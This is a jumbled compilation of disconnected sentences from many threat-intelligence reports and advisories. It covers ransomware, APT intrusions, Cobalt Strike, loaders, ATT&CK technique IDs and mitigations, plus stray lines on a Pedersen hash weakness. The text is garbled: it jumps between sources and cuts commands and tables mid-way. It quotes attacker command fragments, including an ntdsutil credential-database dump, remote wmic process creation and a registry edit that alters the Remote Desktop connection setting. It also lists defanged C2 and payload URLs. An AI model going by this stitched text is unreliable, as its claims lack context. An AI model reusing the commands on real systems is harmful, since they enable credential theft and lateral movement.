The third blob contains the wordlist values shown below: ['list', 'stop', 'computer', 'desktop', 'system', 'service', 'start', 'game', 'stop', 'operation', 'black', 'line', 'white', 'mode', 'link', 'urls', 'text', 'name', 'document', 'type', 'folder', 'mouse', 'file', 'paper', 'mark', 'check', 'mask', 'level', 'memory', 'chip', 'time', 'reply', 'date', 'mirrow', 'settings', 'collect', 'options', 'value', 'manager', 'page', 'control', 'thread', 'operator', 'byte', 'char', 'return', 'device', 'driver', 'tool', 'sheet', 'util', 'book', 'class', 'window', 'handler', 'pack', 'virtual', 'test', 'active', 'collision', 'process', 'make', 'local', 'core'] These words are used to build the registry value names. 
Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001 
This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.
For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread. 
Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server. 
/c powershell ntdsutil.exe '
TA0002
The decoy files are a Microsoft Word Document and PDF copy of a document titled Proposed MOU GTE Korea.
See the Mitigations section for recommendations on how to mitigate these issues. 
G0072 Honeybee
We have mentioned that besides scripttodo.ps1, the runanddelete.bat (Figure 14) file was retrieved.
Figure 20 Hidden Malicious dropper script Execution Of Payload Dropper Upon execution of the batch file, Powershell will be invoked and it fetch the Qakbot payload from Internet and execute it on the target system.
Once all security checks are passed, the C2 server sends a shellcode that downloads and runs the Post-Validator Installer. 
Implement Credential Guard to protect the LSA secrets from credential dumping on Windows 10.
The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.
Details of the certificate of the vulnerable driver (top) and Enigma Driver (bottom) Stage 3: EngimaDownloader_s003 The following table shows the details of Enigma.Bot.Net.exe. 
Example of a phishing email The pdf file only contains an external link that has been shortened with the acortaurl service, as shown in Figure 3.
This malware (MD5 087407551649376d90d1743bac75aac8) spawns a fake password file while fetching a remote payload and executing it.
Venture capital firm Japan angelbridge.capital Angel Bridge (https://www.angelbridge.jp) Venture capital firm Japan mizuhogroup.us careers.mizuhogroup.us Mizuho Financial Group (https://www.mizuhogroup.com) Banking holding company Japan bankofamerica.tel bankofamerica.nyc bankofamerica.us.org Bank of America (https://www.bankofamerica.com) Bank and financial services holding company USA tptf.us tptf.ltd ​​Trans-Pacific Technology Fund (https://tptf.co) Venture capital firm Taiwan Victims As we described in the section ‘Long-lasting initial infection’, we discovered that one victim in the UAE, probably a home financing company, was compromised by classic BlueNoroff group malware.
As with any detection approach and security tool, there are limitations.
Dynamic API loading The following is a list of API hash values along with the names of functions that have been used in this sample (Please note that the hash value might be different in other variants since the malware author changed some of the constant values in the hash generator function). 
.dbf .disk .djvu .doc .docx. 
The team maintained multiple Cobalt Strike servers hosted by a cloud vendor.
Connect with an eSentire Security Specialist. 
The threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network, redirecting a Myanmar government owned-domain to an attacker-controlled server. 
Key findings: A previously unknown Go-based backdoor called TinyNote was found on one of the Camaro Dragon distribution servers, in addition to being spotted in the wild.
Post-compromise Activities Once candidate systems have been identified for encryption by the threat actors, the ransomware deployment occurs and all viable files will be encrypted.
Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored. 
MC_PINGMeant for DDoS on Minecraft servers.
Figure 17: String decryption of the DLL names used within the Forked Loader. 
Pulse Secure VPN Servers CISA has conducted multiple incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2019-11510—an arbitrary file reading vulnerability affecting Pulse Secure VPN appliances—to gain access to victim networks.
Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script.
They may also use the wmiexec module from Impacket to execute commands and move across the network. ;T1569.002 System Services: Service Execution;The BlackCat ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service. 
Convert.
Now let’s focus on packers, how they work, how to identify packed files, and how to extract the packed payload that can contain malicious code. 
Additionally, on at least three occasions, UNC215 employed a custom tool associated with Iranian actors whose source code was leaked. 
S0076 FakeM
These samples helped us to understand how this tool works, what malware it loads and which threat actor uses it. 
This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual - local area networks, or other separation techniques.
An analysis of their deployments also revealed a level of coordination and collaboration. 
The configuration contains the payload marker or header, XOR key, CRC32 hash, the offset, and the size of each compressed binary (Figure 25).
S0021 Derusbi
With the identification of these new WatchDog scripts, Unit 42 researchers found that techniques that have been synonymous with the TeamTNT group have gone missing.
Examining a sample of REvil from 2019 (SHA256: 6a2bd52a5d68a7250d1de481dcce91a32f54824c1c540f0a040d05f757220cd3), the resemblance can be seen.
> /password:<readcted_password> process call create "cmd /c qwinsta >$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>
Remote Access Software T1572:
[WINDOWS-SECURITY] Service being stopped by net command v2 5008344 
Custom Actions are the operations defined by the user during installation or MSI execution.
This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.
These parts contain various properties that collectively determine the document’s display and processing.
Figure 18.
Use browser and application sandboxes or remote virtual environments to mitigate browser or other application exploitation. 
Attackers often use this functionality to persist the execution of backdoors at system start up.
Use signature-based network intrusion detection and prevention systems to identify adversary malware coming into the network. 
Once it identifies a running transaction, the malware will intercept and modify the content of the transaction in order to be able to capture the card information and to request new EMV cryptograms to the victim’s card.
Cisco Secure Malware Analytics (formerly Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. 
C0002 Night Dragon
The code is shown in Figure 11. Figure 11.
Listed existing network connections
The sample’s command and control (C2) server is also located on the CHINANET Jiangsu province network in the city of Nanjing.
The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection.
Notably, this variant also contains an error message string in Arabic ('ضائع' – which translates to: lost or missing). 
All Shift.
[2] Ibid. 
title: Earth Zhulong:
The shortcut file (2) executes a CMD file (3) when clicked. 
The team queried the AD for information about the network's sites and subnets. 
In this particular campaign, system/log data and executable code is dropped into %temp%. 
Use Remote Browser Isolation (RBI) technology to provide additional protection when there is a need to visit websites that fall in categories that can present higher risk, like Newly Observed and Newly Registered Domains. 
Uses MsiEnumProductsA and MsiGetProductInfoA APIs. 
The most common initial access vector observed in this attack was account compromise through credential stuffing, and all the compromised administrator accounts did not have MFA enabled.
ADC4EB1EDAC5A53A37CC8CC90B11824263355687libpng13.dllWin32/Agent.
Code similarities in CCPASS and ucmMsStoreProtocolMethod It works in a similar way to ABPASS.
Figure 14.
This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need.
S0189 ISMInjector
In this case, it schedules the immediate execution of the function “ostrategicy”.
The malware also writes the hardcoded string 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX in the sector.
Analysis of locker_Apple_M1_64 In this section we’ll more deeply analyze the malicious logic of the locker_Apple_M1_64 binary …which is simplified by the fact that the binary’s symbols aren’t stripped.
The final section of the first stage PowerShell is where the code diverges from the variant observed in April.
(Some explanation: Importlib is typically used in cases where the imported library is dynamically modified upon import.
The Trojan Loader. 
Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.
In the past, similar functionality was linked to LockBit 2.0. 
The red team sent tailored spearphishing emails to seven targets using commercially available email platforms [T1585.002].
"SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe. 
The CAB is unpacked to %APPDATA%, and depending on architecture, the interpreter ends up in one of the following directories: 
Microsoft is sharing this information along with detections and recommendations with the community to help users and defenders stay vigilant against this campaign with Tax Day approaching in the U.S. on April 18.
In newer variants we noticed commercial encoders ionCube and Zephir, which are self-written extensions that obfuscate the PHP scripts. 
Conclusion LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole.
This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging. 
The following prerequisites must be met in order for domain fronting to be possible: Own a domain.
Further, as IronPython is written in C# and thus its process contains all the Common Language Runtime (CLR) on execution, one can easily load additional assemblies. 
Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php. 
NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels. 
Later, update.byeserver[.]com and update.serverbye[.]com resolved to this address as well.
Content of “Credentials.txt” EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html.
The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.
This ensures that the shellcode will not be decrypted without the correct DLL since the latter contains the correct byte map.
In addition, loaders can be used to set persistence and additional components needed for the execution of the malware.
Sigma We’ll go through a few Sigma rules that can help us detect Cobalt Strike’s network activity. 
There is also an attachment that may or may not be zipped.
The threat actors used default CS configuration and default named pipes.
The below courses of action mitigate the following techniques: Remote Desktop Protocol
Figure 3 shows some IoCs in the memory of the infected process.
[8] AlessandroZ, “The LaZagne Project !!!”
[System.
T1190
%AppData%\dwmcor.exe
Figure 33.
Preparing for Cyber Incidents Review the security posture of third-party vendors and those interconnected with your organization.
It is possible, of course, to take the easy route and intercept and decrypt all of the traffic from our sandbox with a meddler-in-the-middle approach.
Disable protocols using weak authentication. 
[-29, -63]\n\nH = ZcashPedersenHash(message)\nassert 129 * G1 == H\nSince the encoding of our message using Zcash’s encoding function is [-29, -63], the hash of this message corresponds to the linear combination\nH(M) = −29 ⋅ G1 − 63 ⋅ G2\nHowever, since we know that G2 = 35 ⋅ G1, we can rewrite the previous equation as\nH(M) = −29 ⋅ G1 − 63 ⋅ 35 ⋅ G1 = −2234 ⋅ G1 = 129 ⋅ G1\nsince -2234 is equal to 129 modulo the group order, 139.\n
DiscoveryT1135Network Share DiscoveryAgrius operators used cached credentials to check for access to other systems within an internal network. 
More details on Royal ransomware’s other capabilities can be found in Trend Micro’s Threat Encyclopedia. 
= 0xF3 → avp.exe and either ns.exe and/or ccSvcHst.exe 
This has been done mostly via LinkedIn in the past. 
It also defines a Boolean field “type” for storage, whether a file is compressed or not.
Dynamic analysis can open up new areas to explore as one can follow the malware through each stage of its deployment and functionality.
With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.
We have seen the newer TZW variations vary somewhat with regards to file metadata. 
5a 29 00 00 0c 32 39 46 65 58 73 6b 64 70 4c |.Z)…29FeXskdpL| 00000030 59 67 0a 76 6e 50 78 53 46 65 6f 4e 4e |Yg.vnPxSFeoNN| Scroll to view full table 
Group 5171 Group 5171 is a threat actor that utilizes advanced techniques to infiltrate and compromise targets across the Middle East and Europe.
only volume attributes.–nobk=1Do not change the wallpaper of the infected machine.–thread=4Number of threads per CPU.–at=2023/03/24 05:04:20Activation time (trigger time).–nomail=1Do not create a ransom note.
T1482 Domain Trust Discovery Vice Society has been seen using the attack path reconnaissance tool Bloodhound during the initial stages of their attack before ransomware is deployed. 
[T1212] Chinese state-sponsored cyber actors have been observed exploiting Pulse Secure VPN appliances to view and extract valid user credentials and network information from the servers. 
For these reasons, we would not be surprised to see SysUpdate samples for the Mac OS platform in the future.
Figure 18 shows the hardcoded configuration for one of their samples. 
FBI has also observed Royal actors gain initial access through exploiting public-facing applications [T1190]. Brokers.
Please see the bottom of our first report for more detections & rules. 
Conclusion The SeroXen developer has found a formidable combination of free resources to develop a hard to detect in static and dynamic analysis RAT.
G1008 SideCopy
Then, DNS spoofing redirects unsuspecting users to the malicious website using a poisoned cache.
S0410 Fysbis
Then the phishing email is sent to the list of extracted email addresses one at a time, deleting the “fb” folder to cover its paths and avoid detection.
i -n 1 >> res.txt Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon. 
The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.
Focus on patching critical and high vulnerabilities that allow for remote code execution or denial-of-service on externally facing equipment and CVEs known to be exploited by Chinese state-sponsored cyber actors.
The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets’ domain.
Here, we observed a compiled Python file (full.pyc) present inside the PyPI package that contained malicious functionality.
The actors manually disabled Windows Defender via the GUI. 
This is another way the attackers try to evade detection. 
The actor may then perform actions as the logged-on user. 
It loads several libraries during the runtime and generates the beacon traffic according to the embedded configuration file.
Use threat intelligence and open-source exploitation databases to determine services that are targets for exploitation. 
= "" ] && kill "$PIDW" > /dev/null 2>&1; [ "$PID" !
The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses.
621B31D5778EC2FB72D38FB61CED110A6844D094N/AWin64/Rozena.
Child process injection. 
It then copies the “Login Data” file to a temporary file “chromedb_tmp”, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the “passwords.txt” file. 
Once on a victim's machine, masquerading as a known application with a complex obfuscation also means that anyone relying on signature-based malware effectively has no way of knowing Babadeda is on their machine — or of stopping it from executing. 
Threat actors sometimes create privileged user accounts to keep access to target systems without having to install persistent remote access tools on the system. 
QBot, also known as Qakbot, is a Windows malware strain that started as a banking trojan and evolved into a malware dropper.
Apache is a registered trademark of Apache Software Foundation.
>= 134 and pe.rich_signature.toolid(261, 29395)
The DNS-responses weren’t logged.
S0526 KGH_SPY
Figure 8 Pyramid of Pain Beyond investigating those artifacts, we also took possible geopolitical interests and potential deception into consideration when building our hypothesis.
>= 6 and pe.rich_signature.toolid(257, 29395)
Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet.
S0083 Misdat
Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations. 
Before March 2020, the NetWalker ransom note indicated how to contact the adversary directly using anonymous email account services with random names (such as kkeessnnkkaa@cock.li and hhaaxxhhaaxx@tuta.io): Figure 2.
Windows Command ShellAttackers were seen using Windows Command Shell to execute the initial dropper. PersistenceT1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderModPipe can use Registry Run key for persistence. 
Pedersen Hash DefinitionWe illustrate the Pedersen Hash function and its security properties and requirements using a toy example, with accompanying code in SageMath.
One aspect of the actions taken by the Incident Response team was a live log review.
LockBit 2.0 geographical impact chart.
It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform. 
This contains over 100 IP’s for potential C2 servers. 
This page provides an overview of the situation, a threat analysis, information for hunters, and information on detection protection. 
For example, when a Microsoft Office file is fetched from the internet, the OS opens it in Protected View, which restricts the execution of the embedded macro.
Monitor for and investigate unusual scripting behavior.
G1019 MoustachedBouncer
Backdoor.
The dropper then forks itself in order to launch the legitimate application.
Drop a file named ossutilconfig in the %USERPROFILE% directory.
Reset credentials after virtual private network (VPN) devices are upgraded and reconnected to the external network. 
Running this ruleset over the data in the memory dump revealed the following (redacted for the sake of readability) output: Figure 3 Output Yarascan memory dump 
The previously mentioned NetTask already accomplishes persistence in most cases, by executing on system startup.
By understanding this, we can implement an automated system to help us retrieve encrypted data and streamline the analysis process.
Palo Alto Networks helps detect and prevent Black Basta ransomware in the following ways: WildFire:
Incoming messages with an invalid signature are discarded. 
The last section contains the second stage PowerShell code: Figure 8 CyberChef recipe to extract the second stage PowerShell from the payload package. 
For example, file writes to the registry transaction file for the default user are likely to be uncommon. 
Security product vendors check for main image unmapping combined with the usage of NtGetContextThread/NtSetContextThread to detect process hollowing. 
getsystem 
How to Prevent Attempts to Infect Web Browsers During Process Creation 
During our investigation we were able to see file activity dating back to February 3, 2023.
This research paper released by academics from the University of California, Berkeley, is a great introduction to domain fronting.
Additionally, Palo Alto Networks VM-Series and CN-Series products offer cloud protections that can prevent network connections from cloud instances toward known malicious IP addresses and URLs. 
Background Late Saturday (April 15the), @MalwareHunterTeam tweeted about a new LockBit ransomware variant targeting macOS: As shown in the tweet, the ransomware binary initially was undetected by any of the anti-virus engines on VirusTotal: locker_Apple_M1_64 on VirusTotal (image credit: @MalwareHunterTeam) 
The mount module will use NetUseEnum to identify the current list of locally-mounted network shares and add them to the list to be encrypted.
Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.
This variant extends the backdoor’s known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows. 
We will use a slightly modified version of the jquery profile to illustrate how the configuration defines the various fields that make up the C2 connection.
Figure 3: A view of the HTML code behind the decoy template There is a server-side check prior to each visit to the page to determine if the user has already been served the fake template or not, in which case the webserver will return legitimate content instead. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
Nanopool mining operation. 
Other details such as payment-per-day breakdowns and the BTC payment address are identical. 
We’ll take a peek at the log file’s contents shortly. 
The User-Agent value is an interesting one, “MINIXL”.
First Stage PowerShell The PowerShell command contains various obfuscated strings, as seen in the right side of Figure 3.
S0568 EVILNUM
[T1057], System Location Discovery
Interestingly, articles by SentinelOne and ObjectiveSee do not mention this domain.
title: Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release url: https://cofense.com/blog/open-source-gh0st-rat-still-haunting-inboxes-15-years-after-release/ Found in Environments Protected By: Proofpoint By Nathaniel Raymond, Cofense Intelligence Gh0st RAT, a decades-old open-source remote administration tool (RAT), recently appeared in phishing campaigns targeting a healthcare organization.
It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption.
Lateral Movement and Persistence Royal actors often use RDP to move laterally across the network
Within this list though, they have typos for botpackn3dat.
S1122 Mispadu
These phishing websites contain fake installers, luring users into downloading and installing the malware. 
reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t
The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it’s executing from a trusted, signed binary. 
In some cases, it took weeks or months before the application was utilized.
Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [DS0009]. 
%3cxdesktopapp/18.11.1197%' ) 
Figure 8.
All remaining inaccuracies are the sole responsibility of the author.\n
Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People’s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks. 
Overview 
cmd.exe /q
The APT group consistently adapts its techniques and incorporates new tools into its arsenal as it evolves. 
The random name generated by the sample during our analysis was “_upyqta2_J”.
Verifying that CET is enabled with Process Explorer Under the “Stack Protection” column, Process Explorer confirms that CET is enforced for only the CET-compatible modules, meaning that the mitigation will be enforced for any module compiled with CET.
HYPERBRO samples MD5:
Don’t Sleep has the capability to keep the computer from being shutdown and the user from being signed off.
Application object to execute the downloaded file. 
Ransom Cartel first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.
T1041
ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.
The team then exploited the Unconstrained Delegation misconfiguration to steal the DC’s TGT.
This execution file is generated from the tool “PS2EXE-GUI”, which can convert PowerShell scripts to EXE Files. 
.Pid .ProcessName .CommandLine .Rule 4616 svchost.exe C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s
FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. 
It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms.
If we try to skip this part directly, the process will terminate. 
--root=. --auth
Both share the same file structure (a PE payload hidden in a DOCX file) as the one we referred to in the arrival vectors section.
Specifically, the domain oracle.zzhreceive[.]top was originally linked to TeamTNT operations due to the usage of the term zzhreceive, which has been witnessed within several TeamTNT operations.
Following that, EVIL RABBIT, a security researcher on Twitter with the handle @D4RKR4BB1T47, recently shared a tweet featuring a picture of the dashboard panel used by the NoEscape ransomware group. 
The forked process makes a call to execl to execute the legitimate Logic Pro X application located in /tmp/. 
This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain. 
PowerShell T1059.003 Command and Scripting Interpreter: Windows Command Shell T1070.004 Indicator Removal on Host: File Deletion T1070.006 Indicator Removal on Host: Timestomp T1071.001 Application Layer Protocol: Web Protocols T1078 Valid Accounts T1082 System Information Discovery T1083 File and Directory Discovery T1087 Account Discovery T1090 Proxy T1095 Non-Application Layer Protocol T1098 Account Manipulation T1105 
These techniques are likely used to confuse Endpoint Detection and Response (EDR) solutions. 
When this interrupt is called to get the size of the area before the EBDA, the hook will reduce the amount of available memory.
The value to be loaded will be stored inside the counterfeit object at an offset from the beginning of the fake object. 
While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that Mint Sandstorm continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices.
This approach would be extremely destructive to both corporate environments and home users with network attached storage systems for backups.
This could indicate a multi-phase attack strategy, where the deployment of backdoors and further persistence mechanisms is carried out separately after credential theft has ensured continued access.
The code responsible for decrypting the next stage payload file_id and Telegram token If the file's download, deobfuscation, and decompression are successful, the malware sends the message "bot getted" to the debug server. Figure 19.
S0511 RegDuke
to Talos, the botnet has specifically targeted Spanish-speaking users in the Americas, and could be based in Brazil.
We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads. 
Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged. 
The line can be seen below: for /f
Since all the items in our counterfeit objects will be referenced at offsets from thethis pointer, we need to make sure to save its value before hijacking the program flow (i.e by corrupting a vtable). 
Note: this technique also applies to Privilege Escalation [TA0004] and Defense Evasion [TA0005]. 
[location of downloaded PDF file] 
They often leverage dual-use tools for various purposes to minimize their footprint and evade detection.
Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.
XDR tools should be deployed to endpoints in order to detect behavior of Cobalt Strike loaders and Meterpreter stagers as they are frequently used by a wide range of actors. 
Scripts supported by SystemBC BatLoader Analysis (Second Campaign) 
The Prilex gang claimed responsibility.
Vulnerability 2: Related Generators\nRecall that the original definition requires the generators to be sampled randomly, such that their discrete logarithm with respect to a common generator (or to each other) shall not be known.
While it is highly likely that the threat actor is a Chinese cyberespionage group in the nexus of Gallium and APT41, the exact grouping remains unclear. 
This produces strings including a commandline usage: Usage: %s
FTP server Kodex Ransomware EvilExtractor also has a ransomware function.
title: Vulnerability in Essential Addons for Elementor Leads to Mass Infection url: https://blog.sucuri.net/2023/05/vulnerability-in-essential-addons-for-elementor-leads-to-mass-infection.html 
If the zero scalar could be obtained, the result of the scalar multiplication would be the point-at-infinity, which could lead to unexpected issues when trying to use that result.\n
While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim. 
The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings. 
If we analyze the graphic below, we can see that Turkey, Israel, Iraq, UAE, and Pakistan are among the top targets of MuddyWater.
or ( all of them )} MITRE: Command and Scripting Interpreter – T1059External Proxy – T1090.002Remote Desktop Protocol – T1021.001OS Credential Dumping –
This field was replaced by “onion1” and “onion2”, and these fields are set with the NetWalker blog URL/payment page (hxxp://rnfdsgm<snip>drqqd.onion/).
As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report. 
This string contains the PowerShell to execute GuLoader’s shellcode. 
Following previous predictions, we can now say that UEFI threats are gradually becoming a norm.
The SSL certificate for the domain softlemon[.]net with the serial number 4aa6af6d719bfdd1c6dff3d7b640aed7ee3was issued by Let's Encrypt, a free SSL certificate provider. 
We can find it in each of the samples. 
Note: this technique also applies to
Conclusion This article should give a good overview of Hancitor’s capabilities and behavior as of February 2021. Indicators of Compromise (IOCs) 
A detailed report on the Lizar Toolkit can be found here. 
This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload. 
Network Service Discovery Trigona operators use NetScan to enumerate hosts within victims’ domains that might be vulnerable to remote software exploitation. T1069.
When the Lite Loader was dropped on Emotet infections, that fact made sense, since this version of IcedID was specifically being deployed on already infected machines, and there was no need to check the host information. 
There is only a short window of time between a vulnerability disclosure and active compromise attempts, and website owners are not realistically able to manually issue patches in such short time frames in all instances.
Indicators of Compromise (IOCs) 
Hungry for data ModPipe backdoor hits POS software used in hospitality sector
Table 1 contains an overview of these resources and their use. 
This may be direct translations, however adding any additional character following the Russian phrases changes the translation to "Lock on Path", and "launch with balls" respectfully.
Based on known behavior of this group, we suspect that the documents have been distributed to targets as attachments to phishing emails.
# Colliding Message:  
On the last instruction the ‘this’ pointer is loaded into RAX, which will be used as a reference to invoke the API and its argument: 0:000> 
Data Lake The below query will search for hosts that have communicated with the various known URLs in use by this campaign. 
The HTML was never used.
T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size. 
The team planned to use the organization’s mobile device management (MDM) software to move laterally to the SBS 1 administrator’s workstation and, from there, pivot to SBS 1 assets. 
The entry point code calls a function to allocate virtual memory in its own process space. Function at address 00401550 shows the allocation of virtual memory. 
Meanwhile, loader.ja is used under two processes: One is under googleupdate.exe, which is used for the first sideloading.
This document was exfiltrated and used to continue the intrusion via a company portal and VPN. 
Once the affiliate is confirmed, they are given unique access to a Tor-based control panel that hosts the affiliate’s access. 
The resulting value is session_secret_1.
G0076 Thrip
\Public\DESKTOP-UT9NJ4S.cmd Next, the script downloads a malicious ZIP file — “m.zip” — from a server using the URL “hxxp[://]216[.]238[.]70[.]224/20/t/e/m.zip” to the random name folder.
The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
Data is compressed with GZip prior to encryption. 
%d! 0x30 CmdWrite error : %d 0x20 - Table 2.
Depending on the configuration, either uninstalls itself (by deleting its directory and the scheduled task) or goes to sleep until system reboot. 
Darktrace regularly observes malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.
[D3-DQSA] File Access Pattern Analysis
Impair Defenses: Disable or Modify System Firewall Deletes rules in the Windows Defender Firewall exception list related to AnyDesk T1070.004.
Hidden Files and Directories
(Updated July 19, 2021) Click here for indicators of compromise (IOCs) in STIX format. 
Even if users find themselves exposed to such threats, AhnLab EDR can provide trace data for appropriate responses. 
Some of these nodes operate as part of an encrypted proxy service to prevent attribution by concealing their country of origin and TTPs. 
LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.
Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication. 
title: Revisiting the NSIS-based crypter url: https://blog.malwarebytes.com/threat-analysis/2021/05/revisiting-the-nsis-based-crypter/ 
The most likely attack vectors employed by ransomware affiliates targeting LATAM government entities include the use of compromised valid credentials obtained via infostealer infection, initial access broker sale, or purchase on a dark web shop or marketplace.
Enable a firewall on agency workstations, configured to deny unsolicited connection requests. 
Unix Shell (T1059.004) 
title: Inside the Mind of a Cyber Attacker: from Malware creation to Data Exfiltration (Part 1) url: https://blog.hacktivesecurity.com/index.php/2023/06/05/inside-the-mind-of-a-cyber-attacker-from-malware-creation-to-data-exfiltration-part-1/ 2 0 DISCLAIMER – This article is provided for educational and informational purposes only.
This action deletes the pointer to the file but not the file data, making it recoverable with forensic tools as long as the Operative System does not write any other file in the same physical location. 
Infected Linux device connected to a C&C server How to protect NAS devices Without proper security implemented in NAS devices, users and businesses will continue to be targeted since these tools can be used as entry points for information theft, malware infection, and the disruption of operations, among others.
Figure 5 – List of Services to Stop Prior to encrypting the files, the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions to search and identify accessible volumes on the targeted system.
Trending Threats Remote Mac Exploitation Via Custom URL Schemes (August 30, 2018) 
Familiar Patterns Target Southeast Asian Firms url: https://www.trendmicro.com/en_us/research/23/b/earth-zhulong-familiar-patterns-target-southeast-asian-firms.html Cyber Crime Earth Zhulong:
hxxp[:]//195[.]123[.]226[.]91/c2sock 
Original checksum 2846984875 ... 
S0162 Komplex
script_upyqta2_J.exeAutoIt interpreter_upyqta2_J.iaEncrypted trojan DLL_upyqta2_J.mdatEncrypted Spam tool DLL_upyqta2_Ji7.exeKinit.exe, a legitimate executablejli.dllBanking trojan MSVCR100.dllLegitimate DLLWebView2Loader.dllLegitimate DLLMalicious shortcut files detonate the payloads after system restartAfter the PowerShell downloader reboots the victim’s machine, the malicious Windows shortcut files dropped in the Windows startup folder are run, executing the payloads used in the attack.
Fig.16 CAR script for remediation You can also create dashboards for better visualization. 
This led our responders to identify the occurrence of “credential hopping,” where the threat actor leveraged different credentials for each step while moving laterally through the victim’s network.
This prefix hardens the visualization of the attack on the system, but eases attribution of the malware family during the analysis.
Solorigate malware infection chain 
Mitigation and protection guidance The techniques used by this subset of Mint Sandstorm can be mitigated through the following actions: 
As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it’s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications. 
